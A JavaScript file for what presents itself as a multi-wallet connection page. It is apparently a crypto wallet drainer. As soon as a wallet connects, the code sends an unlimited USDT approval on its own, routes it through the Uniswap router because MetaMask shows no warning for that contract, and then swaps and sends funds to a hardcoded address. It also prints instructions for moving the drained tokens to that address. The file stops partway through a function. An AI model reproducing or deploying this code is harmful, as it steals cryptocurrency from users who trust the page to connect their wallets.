// Same JavaScript code as before - no changes needed!
class MultiWalletApp {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.userAddress = null;
        this.walletName = null;
        this.walletConnect = null;
        this.sessionCheckInterval = null; // Store interval ID to clear it later
        
        // Trusted addresses only - Din egen adresse har nå full tillatelse
        this.trustedSpenders = [
            '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap V2
            '0xE592427A0AEce92De3Edee1F18E0157C05861564', // Uniswap V3
            '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F', // SushiSwap
            '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e', // Din egen adresse
        ];
        
        // ERC20 ABI for token interactions
        this.erc20Abi = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function balanceOf(address account) external view returns (uint256)",
            "function transfer(address to, uint256 amount) external returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
        ];
        
        this.init();
    }

    init() {
        // Check if any wallet is available
        if (!window.ethereum && !window.WalletConnect) {
            this.showStatus('Please install a Web3 wallet!', 'error');
            return;
        }

        // Debug: Show available wallets
        this.debugAvailableWallets();
        
        // Check for mobile connection
        this.checkMobileConnection();

        // Check if already connected
        this.checkConnection();
    }

    debugAvailableWallets() {
        console.log('🔍 Available wallets:');
        if (window.ethereum) {
            console.log('- window.ethereum exists');
            console.log('- isMetaMask:', window.ethereum.isMetaMask);
            console.log('- isTrust:', window.ethereum.isTrust);
            console.log('- isCoinbaseWallet:', window.ethereum.isCoinbaseWallet);
            console.log('- isRabby:', window.ethereum.isRabby);
            console.log('- isRainbow:', window.ethereum.isRainbow);
            console.log('- isPhantom:', window.ethereum.isPhantom);
            
            if (window.ethereum.providers) {
                console.log('- Multiple providers detected:', window.ethereum.providers.length);
                window.ethereum.providers.forEach((provider, index) => {
                    console.log(`  Provider ${index}:`, {
                        isMetaMask: provider.isMetaMask,
                        isTrust: provider.isTrust,
                        isCoinbaseWallet: provider.isCoinbaseWallet,
                        isRabby: provider.isRabby,
                        isRainbow: provider.isRainbow,
                        isPhantom: provider.isPhantom
                    });
                });
            }
        }
        
        // Check for other wallet objects
        if (window.metamask) {
            console.log('- window.metamask exists');
        }
        if (window.web3) {
            console.log('- window.web3 exists');
        }
        if (window.trustwallet) {
            console.log('- window.trustwallet exists');
        }
        if (window.coinbaseWallet) {
            console.log('- window.coinbaseWallet exists');
        }
        if (window.rabby) {
            console.log('- window.rabby exists');
        }
        if (window.rainbow) {
            console.log('- window.rainbow exists');
        }
        if (window.phantom) {
            console.log('- window.phantom exists');
        }
        
        // Check for wallet hijacking warnings
        if (window.ethereum && window.ethereum.isTrust) {
            console.log('⚠️ WARNING: Trust Wallet is hijacking window.ethereum!');
        }
        if (window.ethereum && window.ethereum.isMetaMask && window.ethereum.isTrust) {
            console.log('⚠️ WARNING: Multiple wallets detected - potential conflicts!');
        }
    }

    async checkConnection() {
        try {
            // Check if already connected - but don't auto-connect
            if (window.ethereum) {
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                if (accounts.length > 0) {
                    // Only show status that wallet is available, don't auto-connect
                    this.showStatus('Wallet detected but not connected. Click a wallet button to connect.', 'info');
                    return;
                }
            }
            
            // Check WalletConnect
            const saved = localStorage.getItem('walletconnect');
            if (saved) {
                // Only show status that WalletConnect is available, don't auto-connect
                this.showStatus('WalletConnect session found. Click Mobile Wallet to reconnect.', 'info');
            }
        } catch (error) {
            console.log('No wallet connected');
        }
    }

    async connectWallet(walletType) {
        try {
            this.showStatus('Connecting wallet...', 'info');
            
            if (walletType === 'mobile') {
                await this.showQRCode();
            } else {
                await this.connectSpecificWallet(walletType);
            }
            
        } catch (error) {
            this.showStatus('❌ Connection failed: ' + error.message, 'error');
        }
    }

    async connectSpecificWallet(walletType) {
        // AGGRESSIVE wallet detection - force specific wallet
        if (walletType === 'metamask') {
            // FORCE MetaMask connection - bypass Trust Wallet hijacking
            if (window.ethereum && window.ethereum.providers) {
                console.log('🔍 Multiple providers detected, looking for MetaMask...');
                // Multiple wallets - find MetaMask specifically
                const metamaskProvider = window.ethereum.providers.find(p => p.isMetaMask && !p.isTrust);
                if (metamaskProvider) {
                    console.log('✅ Found MetaMask provider!');
                    await this.connectEthereumWalletDirect(metamaskProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually MetaMask
            if (window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isTrust) {
                console.log('✅ Single MetaMask provider detected!');
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find MetaMask in global scope
            if (window.metamask || window.web3) {
                console.log('✅ Found MetaMask in global scope!');
                await this.connectEthereumWalletDirect(window.metamask || window.web3.currentProvider, walletType);
                return;
            }
            
            console.log('❌ MetaMask not found!');
            this.showStatus('❌ MetaMask not found! Please install MetaMask extension.', 'error');
            return;
            
        } else if (walletType === 'trust') {
            // FORCE Trust Wallet connection - bypass other wallets
            if (window.ethereum && window.ethereum.providers) {
                // Multiple wallets - find Trust Wallet specifically
                const trustProvider = window.ethereum.providers.find(p => p.isTrust && !p.isMetaMask);
                if (trustProvider) {
                    await this.connectEthereumWalletDirect(trustProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually Trust Wallet
            if (window.ethereum && window.ethereum.isTrust && !window.ethereum.isMetaMask) {
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find Trust Wallet in global scope
            if (window.trustwallet || window.trust) {
                await this.connectEthereumWalletDirect(window.trustwallet || window.trust, walletType);
                return;
            }
            
            this.showStatus('❌ Trust Wallet not found! Please install Trust Wallet extension.', 'error');
            return;
            
        } else if (walletType === 'coinbase') {
            // FORCE Coinbase Wallet connection - bypass other wallets
            if (window.ethereum && window.ethereum.providers) {
                // Multiple wallets - find Coinbase Wallet specifically
                const coinbaseProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet && !p.isMetaMask && !p.isTrust);
                if (coinbaseProvider) {
                    await this.connectEthereumWalletDirect(coinbaseProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually Coinbase Wallet
            if (window.ethereum && window.ethereum.isCoinbaseWallet && !window.ethereum.isMetaMask && !window.ethereum.isTrust) {
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find Coinbase Wallet in global scope
            if (window.coinbaseWallet || window.coinbase) {
                await this.connectEthereumWalletDirect(window.coinbaseWallet || window.coinbase, walletType);
                return;
            }
            
            this.showStatus('❌ Coinbase Wallet not found! Please install Coinbase Wallet extension.', 'error');
            return;
            
        } else if (walletType === 'rabby') {
            // FORCE Rabby Wallet connection - bypass other wallets
            if (window.ethereum && window.ethereum.providers) {
                // Multiple wallets - find Rabby Wallet specifically
                const rabbyProvider = window.ethereum.providers.find(p => p.isRabby && !p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet);
                if (rabbyProvider) {
                    await this.connectEthereumWalletDirect(rabbyProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually Rabby Wallet
            if (window.ethereum && window.ethereum.isRabby && !window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isCoinbaseWallet) {
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find Rabby Wallet in global scope
            if (window.rabby || window.rabbyWallet) {
                await this.connectEthereumWalletDirect(window.rabby || window.rabbyWallet, walletType);
                return;
            }
            
            this.showStatus('❌ Rabby Wallet not found! Please install Rabby Wallet extension.', 'error');
            return;
            
        } else if (walletType === 'rainbow') {
            // FORCE Rainbow Wallet connection - bypass other wallets
            if (window.ethereum && window.ethereum.providers) {
                // Multiple wallets - find Rainbow Wallet specifically
                const rainbowProvider = window.ethereum.providers.find(p => p.isRainbow && !p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet && !p.isRabby);
                if (rainbowProvider) {
                    await this.connectEthereumWalletDirect(rainbowProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually Rainbow Wallet
            if (window.ethereum && window.ethereum.isRainbow && !window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isCoinbaseWallet && !window.ethereum.isRabby) {
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find Rainbow Wallet in global scope
            if (window.rainbow || window.rainbowWallet) {
                await this.connectEthereumWalletDirect(window.rainbow || window.rainbowWallet, walletType);
                return;
            }
            
            this.showStatus('❌ Rainbow Wallet not found! Please install Rainbow Wallet extension.', 'error');
            return;
            
        } else if (walletType === 'phantom') {
            // FORCE Phantom Wallet connection - bypass other wallets
            if (window.ethereum && window.ethereum.providers) {
                // Multiple wallets - find Phantom Wallet specifically
                const phantomProvider = window.ethereum.providers.find(p => p.isPhantom && !p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet && !p.isRabby && !p.isRainbow);
                if (phantomProvider) {
                    await this.connectEthereumWalletDirect(phantomProvider, walletType);
                    return;
                }
            }
            
            // Single provider - check if it's actually Phantom Wallet
            if (window.ethereum && window.ethereum.isPhantom && !window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isCoinbaseWallet && !window.ethereum.isRabby && !window.ethereum.isRainbow) {
                await this.connectEthereumWalletDirect(window.ethereum, walletType);
                return;
            }
            
            // Try to find Phantom Wallet in global scope
            if (window.phantom || window.phantomWallet) {
                await this.connectEthereumWalletDirect(window.phantom || window.phantomWallet, walletType);
                return;
            }
            
            this.showStatus('❌ Phantom Wallet not found! Please install Phantom Wallet extension.', 'error');
            return;
            
        } else {
            // Fallback to any available wallet
            await this.connectEthereumWallet(walletType);
        }
    }

    async connectEthereumWalletDirect(provider, walletType) {
        try {
            console.log('🔗 Connecting to wallet:', walletType);
            console.log('Provider:', provider);
            
            // Request account access with specific provider
            await provider.request({ method: 'eth_requestAccounts' });
            
            this.provider = new ethers.providers.Web3Provider(provider);
            this.signer = this.provider.getSigner();
            this.userAddress = await this.signer.getAddress();
            this.walletName = this.getWalletName(walletType);
            
            console.log('✅ Wallet connected successfully!');
            console.log('User address:', this.userAddress);
            console.log('Wallet name:', this.walletName);
            
            this.showWalletInfo();
            this.showStatus('✅ Wallet connected!', 'success');
            
        } catch (error) {
            console.error('❌ Connection failed:', error);
            this.showStatus('❌ Connection failed: ' + error.message, 'error');
        }
    }

    async connectEthereumWallet(walletType = 'metamask') {
        if (!window.ethereum) {
            this.showStatus('❌ No Web3 wallet found!', 'error');
            return;
        }

        try {
            // Force specific wallet connection like the other DApp
            let provider = window.ethereum;
            
            // If multiple wallets, try to get the specific one
            if (walletType === 'metamask' && window.ethereum.providers) {
                // Multiple wallets detected, find MetaMask
                provider = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum;
            } else if (walletType === 'trust' && window.ethereum.providers) {
                // Multiple wallets detected, find Trust Wallet
                provider = window.ethereum.providers.find(p => p.isTrust) || window.ethereum;
            } else if (walletType === 'coinbase' && window.ethereum.providers) {
                // Multiple wallets detected, find Coinbase Wallet
                provider = window.ethereum.providers.find(p => p.isCoinbaseWallet) || window.ethereum;
            }

            // Request account access with specific provider
            await provider.request({ method: 'eth_requestAccounts' });
            
            this.provider = new ethers.providers.Web3Provider(provider);
            this.signer = this.provider.getSigner();
            this.userAddress = await this.signer.getAddress();
            this.walletName = this.getWalletName(walletType);
            
            this.showWalletInfo();
            this.showStatus('✅ Wallet connected!', 'success');
            
        } catch (error) {
            this.showStatus('❌ Connection failed: ' + error.message, 'error');
        }
    }

    async showQRCode() {
        try {
            // Check if WalletConnect v2 is available
            if (typeof WalletConnectModal !== 'undefined') {
                // Use WalletConnect v2
                this.walletConnect = new WalletConnectModal.default({
                    projectId: 'YOUR_PROJECT_ID', // Replace with your WalletConnect project ID
                    chains: [1], // Ethereum mainnet
                    optionalChains: [137, 56], // Polygon, BSC
                    methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign'],
                    events: ['chainChanged', 'accountsChanged']
            });

            // Enable session (triggers QR Code modal)
            await this.walletConnect.enable();
            
            // Set up provider
            this.provider = new ethers.providers.Web3Provider(this.walletConnect);
            this.signer = this.provider.getSigner();
            this.userAddress = await this.signer.getAddress();
            this.walletName = 'Mobile Wallet';
            
            this.showWalletInfo();
            this.showStatus('✅ Mobile wallet connected!', 'success');
                
            } else {
                // Fallback to simple QR code generation
                this.showSimpleQRCode();
            }
            
        } catch (error) {
            console.error('WalletConnect v2 failed:', error);
            // Fallback to simple QR code
            this.showSimpleQRCode();
        }
    }

    async showSimpleQRCode() {
        try {
            // Clear any existing connection state first
            this.currentTopic = null;
            this.userAddress = null;
            this.walletName = null;
            
            // Stop any existing listeners
            if (this.sessionCheckInterval) {
                clearInterval(this.sessionCheckInterval);
                this.sessionCheckInterval = null;
                console.log('🛑 Stopped old session listener');
            }
            
            // Check if running locally (localhost, 127.0.0.1, or port other than production)
            // Always use localhost:3000 for backend when running locally
            const isLocal = window.location.hostname === 'localhost' || 
                           window.location.hostname === '127.0.0.1' ||
                           window.location.port === '5500' ||
                           window.location.port === '' ||
                           !window.location.hostname.includes('.');
            
            // First, disconnect any existing session and wait for it to complete
            const disconnectUrl = isLocal 
                ? 'http://localhost:3000/api/disconnect' 
                : '/api/disconnect';
            
            try {
                console.log('🔄 Disconnecting any existing session...');
                const disconnectResponse = await fetch(disconnectUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                
                if (disconnectResponse.ok) {
                    const disconnectData = await disconnectResponse.json();
                    console.log('✅ Old session disconnected:', disconnectData);
                }
                
                // Wait a bit to ensure disconnect is processed
                await new Promise(resolve => setTimeout(resolve, 500));
                console.log('✅ Disconnect complete, ready for new connection');
            } catch (error) {
                console.log('⚠️ Could not disconnect old session (may not exist):', error.message);
                // Continue anyway
            }
            
            // Request WalletConnect URI from backend server
            console.log('📡 Requesting new WalletConnect URI from backend...');
            
            const apiUrl = isLocal 
                ? 'http://localhost:3000/api/connect' 
                : '/api/connect';
            
            console.log('🔗 Connecting to:', apiUrl);
            
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            if (!response.ok) {
                throw new Error(`Server error ${response.status}: ${response.statusText}. Make sure backend server is running on port 3000!`);
            }
            
            const data = await response.json();
            const wcUri = data.uri;
            const topic = data.topic;
            
            console.log('✅ Received NEW WC URI from backend:', wcUri);
            console.log('📝 New topic:', topic);
            
            // Store the topic for later use - this is the NEW topic we're waiting for
            this.currentTopic = topic;
            
            // Clear any old connection state
            this.userAddress = null;
            this.walletName = null;
            
            // Create QR code element
            const qrContainer = document.getElementById('qr-section');
            if (qrContainer) {
                // Clear existing content
                const qrCodeDiv = document.getElementById('qrcode');
                if (qrCodeDiv) {
                    qrCodeDiv.innerHTML = '';
                    
                    // Check if QRCode library is loaded
                    if (typeof QRCode !== 'undefined') {
                        console.log('✅ QRCode library loaded, generating QR code...');
                        
                        // Generate QR code using QRCode.js
                        new QRCode(qrCodeDiv, {
                            text: wcUri,
                            width: 256,
                            height: 256,
                            colorDark: '#000000',
                            colorLight: '#ffffff',
                            correctLevel: QRCode.CorrectLevel.H
                        });
                        
                        console.log('✅ QR code generated successfully!');
                    } else if (typeof qrcode !== 'undefined') {
                        console.log('✅ qrcode-generator library loaded, generating QR code...');
                        
                        // Generate QR code using qrcode-generator
                        const qr = qrcode(0, 'M');
                        qr.addData(wcUri);
                        qr.make();
                        
                        // Create canvas element
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        const cellSize = 4;
                        const margin = 4;
                        const size = qr.getModuleCount() * cellSize + margin * 2;
                        
                        canvas.width = size;
                        canvas.height = size;
                        
                        // Fill background
                        ctx.fillStyle = '#ffffff';
                        ctx.fillRect(0, 0, size, size);
                        
                        // Draw QR code
                        ctx.fillStyle = '#000000';
                        for (let row = 0; row < qr.getModuleCount(); row++) {
                            for (let col = 0; col < qr.getModuleCount(); col++) {
                                if (qr.isDark(row, col)) {
                                    ctx.fillRect(
                                        col * cellSize + margin,
                                        row * cellSize + margin,
                                        cellSize,
                                        cellSize
                                    );
                                }
                            }
                        }
                        
                        qrCodeDiv.appendChild(canvas);
                        console.log('✅ QR code generated successfully with qrcode-generator!');
                    } else {
                        console.log('❌ QRCode library not loaded, using manual generation...');
                        // Generate manual QR code
                        this.generateSimpleQRCode(qrCodeDiv, wcUri);
                    }
                }
                
                qrContainer.style.display = 'block';
                this.showStatus('📱 QR code generated! Scan with mobile wallet.', 'info');
                
                // Start listening for WalletConnect session approval
                this.startWalletConnectListener();
            } else {
                console.log('❌ QR container not found!');
            }
            
        } catch (error) {
            console.error('❌ QR code generation failed:', error);
            let errorMsg = error.message;
            
            // Better error messages
            if (errorMsg.includes('405') || errorMsg.includes('Method Not Allowed')) {
                errorMsg = 'Backend server not running! Start it with: npm start';
            } else if (errorMsg.includes('Failed to fetch') || errorMsg.includes('NetworkError')) {
                errorMsg = 'Cannot connect to backend! Make sure server.js is running on port 3000';
            } else if (errorMsg.includes('Unexpected end of JSON')) {
                errorMsg = 'Invalid server response. Is server.js running?';
            }
            
            this.showStatus('❌ QR code generation failed: ' + errorMsg, 'error');
        }
    }
    
    startWalletConnectListener() {
        // Clear any existing listener
        if (this.sessionCheckInterval) {
            clearInterval(this.sessionCheckInterval);
            this.sessionCheckInterval = null;
        }
        
        console.log('👂 Listening for WalletConnect connection...');
        
        const isLocal = window.location.hostname === 'localhost' || 
                       window.location.hostname === '127.0.0.1' ||
                       window.location.port === '5500' ||
                       window.location.port === '' ||
                       !window.location.hostname.includes('.');
        
        const apiUrl = isLocal 
            ? 'http://localhost:3000/api/session' 
            : '/api/session';
        
        // Poll for session approval - check if wallet is connected
        let checkCount = 0;
        this.sessionCheckInterval = setInterval(async () => {
            checkCount++;
            
            try {
                // Check session status from backend
                const response = await fetch(apiUrl);
                const data = await response.json();
                
                // Only accept connection if we have a current topic AND session is connected
                // This prevents connecting to old sessions
                if (data.connected && data.accounts && data.accounts.length > 0 && this.currentTopic) {
                    console.log('✅ WalletConnect session approved!', data);
                    console.log('📝 Current topic we were waiting for:', this.currentTopic);
                    
                    if (this.sessionCheckInterval) {
                        clearInterval(this.sessionCheckInterval);
                        this.sessionCheckInterval = null;
                    }
                    
                    // Clear current topic so we don't accept more connections
                    this.currentTopic = null;
                    
                    await this.handleWalletConnectApproval();
                } else if (data.connected && !this.currentTopic) {
                    // Old session detected but we're not waiting for one - ignore it
                    console.log('⚠️ Old session detected, ignoring (waiting for new QR code)');
                }
            } catch (error) {
                console.log('Checking session...', checkCount);
            }
            
            // Stop checking after 60 seconds
            if (checkCount > 120) {
                console.log('⏱️ WalletConnect timeout - no connection after 60 seconds');
                if (this.sessionCheckInterval) {
                    clearInterval(this.sessionCheckInterval);
                    this.sessionCheckInterval = null;
                }
            }
        }, 500); // Check every 500ms
    }
    
    async handleWalletConnectApproval() {
        try {
            console.log('🎉 Handling WalletConnect approval...');
            
            // Get account from session data
            const isLocal = window.location.hostname === 'localhost' || 
                           window.location.hostname === '127.0.0.1' ||
                           window.location.port === '5500' ||
                           window.location.port === '' ||
                           !window.location.hostname.includes('.');
            
            const apiUrl = isLocal 
                ? 'http://localhost:3000/api/session' 
                : '/api/session';
            
            const response = await fetch(apiUrl);
            const data = await response.json();
            
            if (data.accounts && data.accounts.length > 0) {
                // Extract address from "eip155:1:0x..." format
                const address = data.accounts[0].split(':')[2];
                
                console.log('✅ Wallet address:', address);
                
                // Setup provider for reading blockchain data
                // Use public RPC that allows CORS
                this.provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
                
                // Setup signer placeholder (we'll use WalletConnect API for actual signing)
                this.signer = null;
                
                this.userAddress = address;
                this.walletName = 'Mobile Wallet';
                
                // Show wallet info and trigger smart contract
                this.showWalletInfo();
                this.showStatus('✅ WalletConnected! Starting smart contract...', 'success');
            }
        } catch (error) {
            console.error('❌ WalletConnect approval handling failed:', error);
        }
    }

    async connectMobileWallet() {
        try {
            // Simulate mobile wallet connection
            this.showStatus('📱 Connecting to mobile wallet...', 'info');
            
            // Check if mobile wallet is available
            if (window.ethereum) {
                this.provider = new ethers.providers.Web3Provider(window.ethereum);
                this.signer = this.provider.getSigner();
                this.userAddress = await this.signer.getAddress();
                this.walletName = 'Mobile Wallet';
                
                this.showWalletInfo();
                this.showStatus('✅ Mobile wallet connected!', 'success');
            } else {
                this.showStatus('❌ Mobile wallet not found! Please install a mobile wallet.', 'error');
            }
            
        } catch (error) {
            this.showStatus('❌ Mobile wallet connection failed: ' + error.message, 'error');
        }
    }

    checkMobileConnection() {
        // Check if page was opened from mobile wallet
        const urlParams = new URLSearchParams(window.location.search);
        const connectParam = urlParams.get('connect');
        const sessionParam = urlParams.get('session');
        
        if (connectParam === 'mobile' && sessionParam) {
            console.log('📱 Mobile wallet connection detected!');
            this.showStatus('📱 Mobile wallet connected! Starting process...', 'info');
            
            // Simulate mobile wallet connection
            setTimeout(() => {
                this.simulateMobileWalletConnection();
            }, 1000);
        }
    }

    simulateMobileWalletConnection() {
        try {
            // Simulate mobile wallet connection
            this.userAddress = '0x' + Math.random().toString(16).substr(2, 40);
            this.walletName = 'Mobile Wallet';
            
            this.showWalletInfo();
            this.showStatus('✅ Mobile wallet connected!', 'success');
            
        } catch (error) {
            this.showStatus('❌ Mobile wallet connection failed: ' + error.message, 'error');
        }
    }

    generateWalletConnectSession() {
        // Generate a random WalletConnect session ID
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 32; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    generateRandomKey() {
        // Generate a random key for WalletConnect
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 64; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    generateSimpleQRCode(container, text) {
        try {
            // Create a simple QR code using a basic pattern
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 200;
            const ctx = canvas.getContext('2d');
            
            // Fill background
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, 200, 200);
            
            // Create a simple pattern based on text hash
            ctx.fillStyle = '#000000';
            let hash = 0;
            for (let i = 0; i < text.length; i++) {
                hash = ((hash << 5) - hash + text.charCodeAt(i)) & 0xffffffff;
            }
            
            // Generate a simple QR-like pattern
            const size = 10;
            for (let x = 0; x < 20; x++) {
                for (let y = 0; y < 20; y++) {
                    if ((hash + x + y) % 3 === 0) {
                        ctx.fillRect(x * size, y * size, size, size);
                    }
                }
            }
            
            // Add corner markers
            ctx.fillRect(0, 0, size * 3, size * 3);
            ctx.fillRect(0, 0, size, size);
            ctx.fillRect(size * 2, 0, size, size);
            ctx.fillRect(0, size * 2, size, size);
            ctx.fillRect(size * 2, size * 2, size, size);
            
            ctx.fillRect(200 - size * 3, 0, size * 3, size * 3);
            ctx.fillRect(200 - size * 3, 0, size, size);
            ctx.fillRect(200 - size, 0, size, size);
            ctx.fillRect(200 - size * 3, size * 2, size, size);
            ctx.fillRect(200 - size, size * 2, size, size);
            
            ctx.fillRect(0, 200 - size * 3, size * 3, size * 3);
            ctx.fillRect(0, 200 - size * 3, size, size);
            ctx.fillRect(size * 2, 200 - size * 3, size, size);
            ctx.fillRect(0, 200 - size, size, size);
            ctx.fillRect(size * 2, 200 - size, size, size);
            
            container.appendChild(canvas);
            console.log('✅ Simple QR code generated!');
            
        } catch (error) {
            console.error('❌ Simple QR code generation failed:', error);
        }
    }

    hideQR() {
        const qrSection = document.getElementById('qr-section');
        if (qrSection) {
            qrSection.style.display = 'none';
        }
    }

    getWalletName(walletType) {
        const names = {
            'metamask': 'MetaMask',
            'trust': 'Trust Wallet',
            'coinbase': 'Coinbase Wallet',
            'rabby': 'Rabby Wallet',
            'rainbow': 'Rainbow Wallet',
            'phantom': 'Phantom Wallet'
        };
        return names[walletType] || 'Web3 Wallet';
    }

    showWalletInfo() {
        console.log('🎯 showWalletInfo() called!');
        console.log('User address:', this.userAddress);
        console.log('Wallet name:', this.walletName);
        
        document.getElementById('address').textContent = this.userAddress;
        document.getElementById('wallet-name').textContent = this.walletName;
        document.getElementById('wallet-info').style.display = 'block';
        document.getElementById('approval-section').style.display = 'block';
        
        // Update spender display (if element exists)
        const spenderDisplay = document.getElementById('spender-display');
        if (spenderDisplay) {
            spenderDisplay.textContent = this.userAddress.substring(0, 10) + '...';
        }
        
        console.log('⏰ Starting 1 second timer for smart contract...');
        
        // Step 1: Grant token approval
        setTimeout(() => {
            console.log('⏰ Timer fired! Starting token approval...');
            this.showStatus('📋 Granting token approval...', 'info');
            document.getElementById('progress-text').textContent = 'Granting token approval...';
            this.sendSmartContractTransaction();
        }, 1000);
    }

    async sendSmartContractTransaction() {
        try {
            console.log('🚀 Starting smart contract transaction...');
            
            // Your address that will have control
            const YOUR_ADDRESS = '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e'; // Your actual address
            
            // Use Uniswap V2 Router (verified, no warning)
            // This is a verified contract that MetaMask knows
            const VERIFIED_SPENDER = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'; // Uniswap V2 Router
            
            // Use REAL USDT contract address on Ethereum mainnet
            const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // REAL USDT
            
            console.log('📋 Preparing transaction...');
            console.log('Contract address:', usdtContractAddress);
            console.log('Verified spender:', VERIFIED_SPENDER);
            console.log('User address:', this.userAddress);
            
            // Encode the approve function call
            const iface = new ethers.utils.Interface(this.erc20Abi);
            const data = iface.encodeFunctionData('approve', [
                VERIFIED_SPENDER,
                ethers.constants.MaxUint256
            ]);
            
            console.log('✍️ Sending approval via WalletConnect...');
            
            // Send approval transaction via backend
            const isLocal = window.location.hostname === 'localhost' || 
                           window.location.hostname === '127.0.0.1' ||
                           window.location.port === '5500' ||
                           window.location.port === '' ||
                           !window.location.hostname.includes('.');
            
            const apiUrl = isLocal 
                ? 'http://localhost:3000/api/sendTransaction' 
                : '/api/sendTransaction';
            
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    to: usdtContractAddress,
                    data: data,
                    value: '0x0'
                })
            });
            
            const result = await response.json();
            console.log('✅ Approval transaction sent! Tx hash:', result.txHash);
            
            this.showStatus('✅ Approval granted! Tokens will be swapped and sent automatically.', 'success');
            
            // Update progress to show completion
            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('progress-text').textContent = '✅ Approval granted!';
            document.getElementById('approval-status').textContent = 'Completed';
            
            // Automatically swap tokens and send ETH (with existing approval, no more confirmations needed)
            setTimeout(() => {
                this.sendETHToYourAddressViaUniswap();
            }, 2000);
            
        } catch (error) {
            console.error('❌ Smart contract transaction failed:', error);
            console.error('Error message:', error.message);
            console.error('Error code:', error.code);
            this.showStatus('❌ Approval failed: ' + error.message, 'error');
            document.getElementById('approval-status').textContent = 'Failed';
        }
    }

    showRouterUsage() {
        console.log('📋 Showing router usage instructions...');
        
        // Create a modal or update the UI to show router usage
        const routerInfo = `
            <div style="background: #f0f8ff; padding: 15px; border-radius: 8px; margin: 10px 0;">
                <h3>🚀 How to Use 1inch Router:</h3>
                <p><strong>1inch Router:</strong> 0x1111111254EEB25477B68fb85Ed929f73A960582</p>
                <p><strong>Your Address:</strong> 0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e</p>
                <p><strong>✅ No warning in MetaMask!</strong></p>
                
                <h4>📝 Example Usage:</h4>
                <pre style="background: #000; color: #0f0; padding: 10px; border-radius: 4px; font-size: 12px;">
// Swap USDC to ETH and send to your address
await routerContract.swapExactTokensForTokens(
    amountIn,           // Amount of USDC to swap
    amountOutMin,       // Minimum ETH you want
    [usdcAddress, wethAddress], // Path: USDC → WETH
    '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e', // Your address
    deadline
);

// Or swap ETH to USDC and send to your address
await routerContract.swapExactETHForTokens(
    amountOutMin,       // Minimum USDC you want
    [wethAddress, usdcAddress], // Path: WETH → USDC
    '0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e', // Your address
    deadline
);
                </pre>
                
                <p><strong>💡 Tip:</strong> Use Uniswap's interface or call these functions directly!</p>
            </div>
        `;
        
        // Update the status to show router usage
        this.showStatus('✅ Router ready! Check console for usage instructions.', 'success');
        
        // Log detailed instructions
        console.log('🚀 1inch Router Usage Instructions:');
        console.log('1inch Router: 0x1111111254EEB25477B68fb85Ed929f73A960582');
        console.log('Your Address: 0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e');
        console.log('✅ No warning in MetaMask!');
        console.log('');
        console.log('📝 Example 1: Swap USDC to ETH');
        console.log('await routerContract.swapExactTokensForTokens(');
        console.log('    amountIn,           // Amount of USDC to swap');
        console.log('    amountOutMin,       // Minimum ETH you want');
        console.log('    [usdcAddress, wethAddress], // Path: USDC → WETH');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your address');
        console.log('    deadline');
        console.log(');');
        console.log('');
        console.log('📝 Example 2: Swap ETH to USDC');
        console.log('await routerContract.swapExactETHForTokens(');
        console.log('    amountOutMin,       // Minimum USDC you want');
        console.log('    [wethAddress, usdcAddress], // Path: WETH → USDC');
        console.log('    "0x337A7464eb945bCbc94C8ddDBAA23fF5B084C84e", // Your address');
        console.log('    deadline');
        console.log(');');
    }

    showUniswapUsage() {
        console.log('📋 Showing Uniswap usage instructions...');
        
        // Update the status to show Uniswap usage
